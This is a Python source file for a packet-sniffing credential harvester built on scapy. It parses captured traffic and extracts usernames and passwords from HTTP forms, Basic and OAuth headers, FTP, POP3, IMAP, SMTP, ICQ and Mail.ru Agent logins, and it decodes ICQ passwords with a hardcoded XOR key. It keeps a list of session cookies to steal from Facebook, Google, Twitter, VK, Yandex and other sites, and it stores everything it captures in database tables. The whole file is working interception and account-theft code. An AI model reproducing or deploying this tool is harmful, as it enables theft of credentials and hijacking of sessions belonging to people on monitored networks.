from multiprocessing import Process, Queue
import scapy.all as scapy
import re
import traceback
import logger
import datetime
import urlparse
import urllib
import struct
import base64

HTTP_PORT = 80
PROXY_PORT = 3128
PROXY2_PORT = 8080
POP3_PORT = 110
FTP_PORT = 21
TELNET_PORT = 23
SMTP_PORT = 25
ICQ_PORT = 5190
MRU_PORT = 2041
IMAP_PORT = 143

class parser:

        _stop = 'stop'

        def __init__(self, options, database):
                self.options = options
                self.database = database
                self.queue = Queue()
                self.proc = Process(target=self.loop)
                self.logger = logger.logger(self)

                self.tcpHandlers = {}
                self.udpHandlers = {}

                # HTTP
                self.httpHandlerInit()
                self.tcpHandlers[ HTTP_PORT ] = self.httpHandler
                self.tcpHandlers[ PROXY_PORT ] = self.httpHandler
                self.tcpHandlers[ PROXY2_PORT ] = self.httpHandler

                # ICQ
                self.icqInitHandler()
                self.tcpHandlers[ ICQ_PORT ] = self.icqHandler

                # FTP
                self.ftpInitHandler()
                self.tcpHandlers[ FTP_PORT ] = self.ftpHandler

                # POP3
                self.popInitHandler()
                self.tcpHandlers[ POP3_PORT ] = self.popHandler
 
                # IMAP
                self.imapInitHandler()
                self.tcpHandlers[ IMAP_PORT ] = self.imapHandler
                
                # SMTP
                self.smtpInitHandler()
                self.tcpHandlers[ SMTP_PORT ] = self.smtpHandler

                # Mail.RU Agent
                self.mruInitHandler()
                self.tcpHandlers[ MRU_PORT ] = self.mruHandler

        def start(self):
                self.proc.start()

        def stop(self):
                self.push(self._stop)
                self.proc.join()

        def push(self, command):
                self.queue.put(command, block=False)

        def loop(self):
                while True:
                        command = self.queue.get()
                        if command == self._stop:
                                break
                        self.process(command)

        def process(self, pkt):

                self.data = pkt.data
                self.src = pkt.src[0]
                self.sport = pkt.src[1]
                self.dst = pkt.dst[0]
                self.dport = pkt.dst[1]


                if not len(self.data):
                        return

                # TCP
                if self.dport in self.tcpHandlers.keys():
                        try:
                                self.tcpHandlers[self.dport]()
                        except Exception, e:
                                self.logger.warn("Fail to parse stream with dport: %d cause of exception: %s" % (self.dport, str(e)))
                                traceback.print_exc()
                                self.logger.warn("Packet from %s:%s to %s:%s" % (self.src,self.sport,self.dst, self.dport))
                                scapy.hexdump(self.data)

        # Charge HTTP handler with regexps
        def httpHandlerInit(self):
                # http request header regexp
                self.http_req_rex = re.compile("(?P<method>(^GET|^POST)) (?P<uri>.+) (?P<version>.+)")
                # http response header regexp
                self.http_resp_rex = re.compile("(?P<version>HTTP/\d\.\d) (?P<code>\d{3})")

                # known http headers
                self.http_headers = ["Host", "User-Agent", "Accept", "Accept-Language", "Accept-Encoding", "Accept-Charset", "Keep-Alive", "Connection", "Referer", "Cookie", "Content-Type", "Content-Length", "Authorization"]

                # steal sensitive data from url 
                self.http_user_roots = ["user", "mail", "nick", "login", "uid", "name", "acct", "account", "member"]
                self.http_passwd_roots = ["pass", "pwd"]

                # Sensitive cookies
                self.http_sens_cookies = {
                                           "vkontakte.ru" : ["remixsid"],
                                           "vk.com" : ["remixsid"],
                                           "facebook.com" : ["c_user", "xs", "datr", "lu"],
                                           "yahoo.com" : ["Y"],
                                           "reddit.com" : ["reddit_session"],
                                           "myspace.com" : ["SessionDDF2"],
                                           "twitter.com" : ["_twitter_sess", "auth_token"],
                                           "mail.google.com" : ["GX"], # main mail cookie
                                           "docs.google.com" : ["WRITELY_SID"],
                                           "picasaweb.google.com" : ["lh"],
                                           "groups.google.com" : ["GROUPS_SID"],
                                           "google.com" : ["SID", "HSID", "SSID", "LSID"], # + https cookies
                                           "google.com" : ["SID", "HSID", "CAL"], # calendar
                                           "google.com" : ["SID", "HSID"], # reader etc, simple auth // http://google.com/profiles/me
                                           "yandex.ru" : ["yandexuid", "yandex_login", "Session_id"],
                                           "moikrug.ru" : ["yandexuid", "yandex_login", "Session_id"],
                                           "narod.ru" : ["yandexuid", "yandex_login", "Session_id"],
                                           "livejournal.com" : ["ljmastersession", "ljloggedin", "ljsession"],
                                           "mail.ru" : ["Mpop"],
                                           "habrahabr.ru" : ["PHPSESSID", "hsec_id"],
                                           "icq.com" : ["karma_login", "karma_session","karma_service"],
                                           "youtube.com" : ["LOGIN_INFO"],
                                           "rutracker.org" : ["bb_data"],
                                           "qip.ru" : ["PHPSESSID", "autologin"],
                                           "blogger.com" : ["blogger_SID"],
                                           "loveplanet.ru" : ["session"],
                                           "liveinternet.ru" : ["bbuserid", "bbpassword", "bbusername", "bbredirect"],
                                           "mamba.ru" : ["s", "LOGIN", "UID", "SECRET"],
                                           "friendfeed.com" : ["AT", "U"],
                                           "bigmir.net" : ["BMS", "BMPS"],
                                           "odnoklassniki.ru" : ["JSESSIONID"]
                                        }

        # Handler for HTTP packets
        def httpHandler(self):

                req_method = ''
                req_url = ''
                req_version = ''
                req_host = ''
                req_ua = ''
                req_ref = ''
                req_ctype = ''
                req_cookie = ''
                req_auth = ''

                time = str(datetime.datetime.now())

                requests = []
                requests_count = 0

                # split packet by large parts, and trying to determine its type(request/response)
                payloads = self.data.split('\r\n\r\n')
                for payload in payloads:
                        request = {}
                        if payload.startswith("GET"):
                                request['header'] = payload + "\r\n"
                                requests.append(request)
                                requests_count += 1
                        elif payload.startswith("PUT"):
                                continue
                        elif payload.startswith("OPTIONS"):
                                continue
                        elif payload.startswith("HEAD"):
                                continue
                        elif payload.startswith("TRACE"):
                                continue
                        elif payload.startswith("POST"):
                                request['header'] = payload + "\r\n"
                                request['data'] = ''
                                requests.append(request)
                                requests_count += 1
                        elif requests_count > 0:
                                if 'data' in requests[requests_count-1]:
                                        requests[requests_count-1]['data'] += payload.replace('\r\n', '')
                
                for request in requests:
                        p = re.search(self.http_req_rex, request['header'])
                        if p:
                                req_method = p.group("method")
                                req_url = p.group("uri")
                                req_version = p.group("version")

                                # workaround for http proxy requests
                                if req_url.startswith("http://"):
                                        up = urlparse.urlparse(req_url)
                                        req_url = up.path + up.query

                                # parse request headers
                                req_headers = {}
                                for h in self.http_headers:
                                        s = re.search("(?i)%s:(?P<value>.+?)[\r\n]" % (h), request['header'])
                                        if s: 
                                                req_headers[h] = s.group("value").strip()

                                # Set ip host if not specified
                                if not 'Host' in req_headers: 
                                        req_headers['Host'] = str(self.dst)


                                # Sitry workaround for multipart data
                                if (req_method == "POST") and ('Content-Type' in req_headers):
                                        udata = request['data']
                                        if req_headers['Content-Type'].find('multipart/form-data') != -1:
                                                res = re.findall(r'multipart/form-data; boundary=(.*)', req_headers['Content-Type'])
                                                if res:
                                                        boundary = res[0]
                                                        multi_parts = request['data'].split(boundary)

                                                        multi_data = ''
                                                        for part in multi_parts:
                                                                res = re.findall(r'Content-Disposition: form-data; name="([%0-9a-zA-Z]+)"([%0-9a-zA-Z]+)', part)
                                                                if res:
                                                                        multi_data += res[0][0] + "=" + res[0][1] + "&"
                                                        udata = multi_data

                                        udata = "/?" + udata
                                        
                                else:
                                        udata = req_url

                                # determine which parameters(GET/POST) we have...
                                up = urlparse.urlparse("//" + req_headers['Host'] + udata)
                                url_params = urlparse.parse_qs(up.query)

                                # Try to find sensitive data in url parameters
                                user_param = self.httpCheckSensParams(self.http_user_roots, url_params)
                                passwd_param = self.httpCheckSensParams(self.http_passwd_roots, url_params)

                                if user_param and passwd_param:
                                        self.database.push("INSERT INTO http_login(date, ip, host, user_field, user_value, passwd_field, passwd_value) VALUES (NOW(),INET_ATON('%s'),'%s','%s','%s','%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), user_field='%s', user_value='%s', passwd_field='%s', passwd_value='%s';" % (self.src, self.database.escape(req_headers['Host']), self.database.escape(user_param[0]), self.database.escape(user_param[1]), self.database.escape(passwd_param[0]), self.database.escape(passwd_param[1]), self.database.escape(user_param[0]), self.database.escape(user_param[1]), self.database.escape(passwd_param[0]), self.database.escape(passwd_param[1])))
                                        self.logger.info("HTTP LOGIN: %s %s=%s:%s=%s" % (req_headers['Host'], user_param[0], user_param[1], passwd_param[0], passwd_param[1]))

                                # Try to find interesting cookies
                                if ('Cookie' in req_headers) and ('User-Agent' in req_headers):
                                        sens = self.httpParseSensCookies(req_headers['Host'], req_headers['Cookie'])
                                        if sens:
                                                self.database.push("INSERT INTO http_cookies(date, ip, host, host_origin, value, ua) VALUES (NOW(),INET_ATON('%s'),'%s','%s','%s', '%s') ON DUPLICATE KEY UPDATE date = NOW(), value='%s', ua='%s';" % (self.src, self.database.escape(sens[0]), self.database.escape(req_headers['Host']), self.database.escape(sens[1]), self.database.escape(req_headers['User-Agent']), self.database.escape(sens[1]), self.database.escape(req_headers['User-Agent'])))
                                                self.logger.info("HTTP COOKIE: %s %s" % (sens[0], sens[1]))


                                # Try to find interesting in Authorization header
                                if 'Authorization' in req_headers:
                                        auth_data = self.httpParseAuthHeader(req_headers['Authorization'])
                                        if auth_data:

                                                if auth_data[0] == "Basic":
                                                        user = auth_data[1][0]
                                                        passwd = auth_data[1][1]
                                                        self.database.push("INSERT INTO http_auth_basic(date, ip, host, user, passwd) VALUES (NOW(),INET_ATON('%s'),'%s','%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), user='%s', passwd='%s';" % (self.src, self.database.escape(req_headers['Host']), self.database.escape(user), self.database.escape(passwd), self.database.escape(user), self.database.escape(passwd)))
                                                        self.logger.info("HTTP AUTH: Basic %s %s:%s" % (req_headers['Host'], user, passwd))

                                                if auth_data[0] == "OAuth":
                                                        value = auth_data[1]
                                                        self.database.push("INSERT INTO http_auth_oauth(date, ip, host, value) VALUES (NOW(),INET_ATON('%s'),'%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), value='%s';" % (self.src, self.database.escape(req_headers['Host']), self.database.escape(value), self.database.escape(value)))
                                                        self.logger.info("HTTP AUTH: OAuth %s %s" % (req_headers['Host'], value))

                                                if auth_data[0] == "AuthSub":
                                                        value = auth_data[1]
                                                        self.database.push("INSERT INTO http_auth_authsub(date, ip, host, value) VALUES (NOW(),INET_ATON('%s'),'%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), value='%s';" % (self.src, self.database.escape(req_headers['Host']), self.database.escape(value), self.database.escape(value)))
                                                        self.logger.info("HTTP AUTH: AuthSub %s %s" % (req_headers['Host'], value))

                                # Collect http log
                                if not 'User-Agent' in req_headers:
                                        req_headers['User-Agent'] = ''

                                if not 'Content-Type' in req_headers:
                                        req_headers['Content-Type'] = ''
                                
                                if not 'Referer' in req_headers:
                                        req_headers['Referer'] = ''
                                
                                if not 'Authorization' in req_headers:
                                        req_headers['Authorization'] = ''
                                
                                if not 'Cookie' in req_headers:
                                        req_headers['Cookie'] = ''

                                if not 'data' in request:
                                        request['data'] = ''

                                self.database.push("INSERT INTO http_log(date, ip, method, host, url, ua, ref, ctype, auth, cookie, post_data) VALUES (NOW(),INET_ATON('%s'), '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s');" % (self.src, self.database.escape(req_method), self.database.escape(req_headers['Host']), self.database.escape(req_url), self.database.escape(req_headers['User-Agent']), self.database.escape(req_headers['Referer']), self.database.escape(req_headers['Content-Type']), self.database.escape(req_headers['Authorization']), self.database.escape(req_headers['Cookie']), self.database.escape(request['data'])))
                                self.logger.info("HTTP: %s %s %s %s %s %s %s %s %s %s" % (self.src, req_method, req_headers['Host'], req_url, req_headers['User-Agent'], req_headers['Referer'], req_headers['Content-Type'], req_headers['Authorization'], req_headers['Cookie'], request['data']))


        def httpCheckSensParams(self, roots, url_params):
                for root in roots:
                        for param_name in url_params:
                                param_value = url_params[param_name][0]
                                if re.match("(?i).*%s.*" % (root), param_name):
                                        return (urllib.unquote(param_name), urllib.unquote(param_value))
                return False
                              

        def httpParseSensCookies(self, host_header, cookie_header):
                for host in self.http_sens_cookies:
                        need_cookies_count = len(self.http_sens_cookies[host])
                        if host_header.find(host) != -1:
                                sens_cookies = ''
                                sens_cookies_found = 0
                                cookie_header_parts = cookie_header.split(";")
                                for cookie in cookie_header_parts:
                                        cookie = cookie.strip()
                                        for sens_cookie_name in self.http_sens_cookies[host]:
                                                if re.search("%s=.*" % (sens_cookie_name), cookie):
                                                        sens_cookies += cookie + "; "
                                                        sens_cookies_found += 1
                                if (sens_cookies_found == need_cookies_count) and len(sens_cookies) > 0:
                                        sens_cookies = sens_cookies[:-2]
                                        return (host, sens_cookies)
                return False

        def httpParseAuthHeader(self, header):

                r = re.search("(?i)Basic (?P<value>.*)", header)
                if r:
                        auth_data = r.group("value")
                        auth_data = base64.b64decode(auth_data)
                        auth_parts = auth_data.split(":")
                        return ("Basic", auth_parts)

                r = re.search("(?i)OAuth (?P<value>.*)", header)
                if r:
                        auth_data = r.group("value")
                        return ("OAuth", auth_data)

                r = re.search("(?i)AuthSub (?P<value>.*)", header)
                if r:
                        auth_data = r.group("value")
                        return ("AuthSub", auth_data) 

                return False
                

        def icqInitHandler(self):
                self.icq_pass_key = [0xF3, 0x26, 0x81, 0xC4, 0x39, 0x86, 0xDB, 0x92, 0x71, 0xA3, 0xB9, 0xE6, 0x53, 0x7A, 0x95, 0x7C] 

        def icqHandler(self):

                ptr = 0
                icq_login = None
                icq_pass = None
                icq_version = None

                # parse only version 7/8
                if hex(ord(self.data[ptr:ptr+1])) != "0x2a":
                        return

                # login sequence 
                #struct flap_hdr {
                #        u_int8 cmd;
                #        u_int8 chan;
                #        u_int16 seq;
                #        u_int16 dlen;
                #};
                #     #define FLAP_CHAN_LOGIN = 1
                flap_hdr_size = 6
                flap_chain_login = 1
                flap_hdr = struct.unpack("!BBHH", self.data[ptr:ptr+flap_hdr_size])
                if flap_hdr[1]  == flap_chain_login:
                        ptr += flap_hdr_size

                        # we need server HELLO (0000 0001) 
                        hello_size = 4
                        if self.data[ptr:ptr+hello_size] == "\x00\x00\x00\x01":
                                ptr += hello_size
                                #struct tlv_hdr {
                                #   u_int8 type[2];
                                #      #define TLV_LOGIN "\x00\x01"
                                #      #define TLV_PASS  "\x00\x02"
                                #   u_int8 len[2];
                                #};

                                tlv_login = 1
                                tlv_pass = 2
                                tlv_version = 3
                                
                                tlv = self.icqReadTlv(ptr, self.data)
                                if tlv[0] != tlv_login:
                                        return
                                icq_login = tlv[2]
                                ptr += tlv[1]


                                tlv = self.icqReadTlv(ptr, self.data)
                                if tlv[0] != tlv_pass:
                                        return
                                icq_pass = self.icqDecodePass(tlv[2])
                                ptr += tlv[1]

                                tlv = self.icqReadTlv(ptr, self.data)
                                if tlv[0] != tlv_version:
                                        return
                                icq_version = tlv[2]
                                ptr += tlv[1]

                if icq_login and icq_pass and icq_version:
                        self.database.push("INSERT INTO icq_cred(date, ip, user, pass) VALUES (NOW(),INET_ATON('%s'),'%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), pass='%s';" % (self.src, self.database.escape(icq_login), self.database.escape(icq_pass), self.database.escape(icq_pass)))
                        self.logger.info("ICQ: %s:%s" % (icq_login, icq_pass))
                                
        def icqReadTlv(self, ptr, raw):
                tlv_hdr_size = 4
                tlv_hdr = struct.unpack("!HH", raw[ptr:ptr+tlv_hdr_size])
                data_len = tlv_hdr[1]
                ptr += tlv_hdr_size
                data = raw[ptr:ptr+data_len]
                return (tlv_hdr[0], data_len+tlv_hdr_size, data)
                

        def icqDecodePass(self, passwd):
                outpass = ''
                for i in range(0,len(passwd)):
                        outpass += chr(ord(passwd[i]) ^ self.icq_pass_key[i])

                return outpass
                        
        def mruInitHandler(self):
                self.mru_MRIM_CS_HELLO                   = 0x1001  # C -> S
                self.mru_MRIM_CS_LOGIN2                  = 0x1038  # C -> S
                self.mru_MRIM_CS_LOGIN                   = 0x1078  # Undocumented, Mail.ru - fucking cheaters

        def mru_s2d(self, s):
                r = ""
                i = len(s)
                while i:
                        t = hex(ord(s[i - 1: i]))[2 : ]
                        if len(t) < 2: t = "0" + t
                        r += t
                        i -= 1
                return int(r, 16)

        def mru_get_packet(self, ptr_start, data):

                #{
                #    u_long      magic;  
                #    u_long      proto;
                #    u_long      seq;
                #    u_long      msg;
                #    u_long      dlen;
                #    u_long      from;
                #    u_long      fromport;
                #    u_char      reserved[16];
                #}

                ptr = ptr_start

                magic = self.mru_s2d(data[ptr:ptr+4]) #0:4
                ptr += 4
                proto = self.mru_s2d(data[ptr:ptr+4]) #4:8
                ptr += 4
                seq = self.mru_s2d(data[ptr:ptr+4]) #8:12
                ptr += 4
                msg = self.mru_s2d(data[ptr:ptr+4]) #12:16
                ptr += 4
                dlen = self.mru_s2d(data[ptr:ptr+4]) #16:20
                ptr += 4
                from_addr = self.mru_s2d(data[ptr:ptr+4]) #20:24
                ptr += 4
                from_port = self.mru_s2d(data[ptr:ptr+4]) #24:28
                ptr += 4
                reserver = self.mru_s2d(data[ptr:ptr+16])#28:44
                ptr +=16
                if dlen > 0:
                        data = data[ptr:ptr+dlen]
                else:
                        data = ""
                
                ptr += dlen

                return (msg, dlen, data, ptr)

        def mru_get_simple_packet(self, ptr_start, data):
                ptr = ptr_start

                dlen = self.mru_s2d(data[ptr:ptr+4])
                ptr += 4
                data = data[ptr:ptr+dlen]
                ptr += dlen

                return (dlen, data, ptr)

        def mruHandler(self):

                ptr = 0
                mru_user = None
                mru_pass = None

                while ptr < len(self.data):
                        packet = self.mru_get_packet(ptr, self.data)
                        ptr = packet[3]
                        dlen = packet[1]
                        msg = packet[0]
                        data = packet[2]

                        if msg == self.mru_MRIM_CS_LOGIN2 or msg == self.mru_MRIM_CS_LOGIN:
                                lptr = 0
                                lpacket = self.mru_get_simple_packet(lptr, data)
                                lptr = lpacket[2]
                                mru_user = str(lpacket[1])
                                lpacket = self.mru_get_simple_packet(lptr, data)
                                mru_pass = str(lpacket[1])
                                break
                if mru_user and mru_pass:
                        self.database.push("INSERT INTO mru_cred(date, ip, user, pass) VALUES (NOW(),INET_ATON('%s'),'%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), pass='%s';" % (self.src, self.database.escape(mru_user), self.database.escape(mru_pass), self.database.escape(mru_pass)))
                        self.logger.info("MAIL.RU AGENT: %s:%s" % (mru_user, mru_pass))


        def popInitHandler(self):
                self.pop_user_rex = re.compile("(?i)USER (.*?)[\r\n]")
                self.pop_pass_rex = re.compile("(?i)PASS (.*?)[\r\n]")

        def popHandler(self):

                pop_user = None
                pop_pass = None

                res = re.findall(self.pop_user_rex, self.data)
                if res:
                        pop_user = res[0]
                res = re.findall(self.pop_pass_rex, self.data)
                if res:
                        pop_pass = res[0]

                if pop_user and pop_pass:
                        self.database.push("INSERT INTO pop_cred(date, ip, host, user, pass) VALUES (NOW(),INET_ATON('%s'),'%s','%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), user='%s', pass='%s';" % (self.src, self.database.escape(self.dst), self.database.escape(pop_user), self.database.escape(pop_pass), self.database.escape(pop_user), self.database.escape(pop_pass)))
                        self.logger.info("POP3: %s %s:%s" % (self.dst, pop_user, pop_pass))

        def imapInitHandler(self):
                self.imap_login_rex = re.compile("(?i) LOGIN (.*?) (.*?)[\r\n]")
                self.authenticate_login_rex = re.compile("(?i) AUTHENTICATE LOGIN[\r\n]+(.*?)[\r\n]+(.*?)[\r\n]+")

        def imapHandler(self):

                imap_user = None
                imap_pass = None

                res = re.findall(self.imap_login_rex, self.data)
                if res:
                        imap_user = res[0][0]
                        imap_pass = res[0][1]

                res = re.findall(self.authenticate_login_rex, self.data)
                if res:
                        imap_user = res[0][0]
                        imap_pass = res[0][1]

                if imap_user and imap_pass:
                        self.database.push("INSERT INTO imap_cred(date, ip, host, user, pass) VALUES (NOW(),INET_ATON('%s'),'%s','%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), user='%s', pass='%s';" % (self.src, self.database.escape(self.dst), self.database.escape(imap_user), self.database.escape(imap_pass), self.database.escape(imap_user), self.database.escape(imap_pass)))
                        self.logger.info("IMAP: %s %s:%s" % (self.dst, imap_user, imap_pass))

        def ftpInitHandler(self):
                self.ftp_user_rex = re.compile("(?i)USER (.*?)[\r\n]")
                self.ftp_pass_rex = re.compile("(?i)PASS (.*?)[\r\n]")

        def ftpHandler(self):

                ftp_user = None
                ftp_pass = None

                res = re.findall(self.ftp_user_rex, self.data)
                if res:
                        ftp_user = res[0]
                res = re.findall(self.ftp_pass_rex, self.data)
                if res:
                        ftp_pass = res[0]

                if ftp_user and ftp_pass:
                        self.database.push("INSERT INTO ftp_cred(date, ip, host, user, pass) VALUES (NOW(),INET_ATON('%s'),'%s','%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), user='%s', pass='%s';" % (self.src, self.database.escape(self.dst), self.database.escape(ftp_user), self.database.escape(ftp_pass), self.database.escape(ftp_user), self.database.escape(ftp_pass)))
                        self.logger.info("FTP: %s %s:%s" % (self.dst, ftp_user, ftp_pass))

        
        def smtpInitHandler(self):
                self.smtp_rex = re.compile("(?i)AUTH LOGIN[\r\n]+(.*?)[\r\n]+(.*?)[\r\n]+")
                self.smtp_plain_rex = re.compile("(?i)AUTH PLAIN (.*?)[\r\n]+")

        def smtpHandler(self):
                smtp_user = None
                smtp_pass = None

                try:
                        res = re.findall(self.smtp_rex, self.data)
                        if res:
                                smtp_user = base64.b64decode(res[0][0])
                                smtp_pass = base64.b64decode(res[0][1])
                        else:
                                raise Exception("stupid")
                except Exception, e:
                        try:
                                res = re.findall(self.smtp_plain_rex, self.data)
                                if res:
                                        parts = base64.b64decode(res[0]).split("\x00")
                                        smtp_user = parts[1]
                                        smtp_pass = parts[2]
                        except:
                                pass
                if smtp_user and smtp_pass:
                        self.database.push("INSERT INTO smtp_cred(date, ip, host, user, pass) VALUES (NOW(),INET_ATON('%s'),'%s','%s','%s') ON DUPLICATE KEY UPDATE date = NOW(), user='%s', pass='%s';" % (self.src, self.database.escape(self.dst), self.database.escape(smtp_user), self.database.escape(smtp_pass), self.database.escape(smtp_user), self.database.escape(smtp_pass)))
                        self.logger.info("SMTP: %s %s:%s" % (self.dst, smtp_user, smtp_pass))


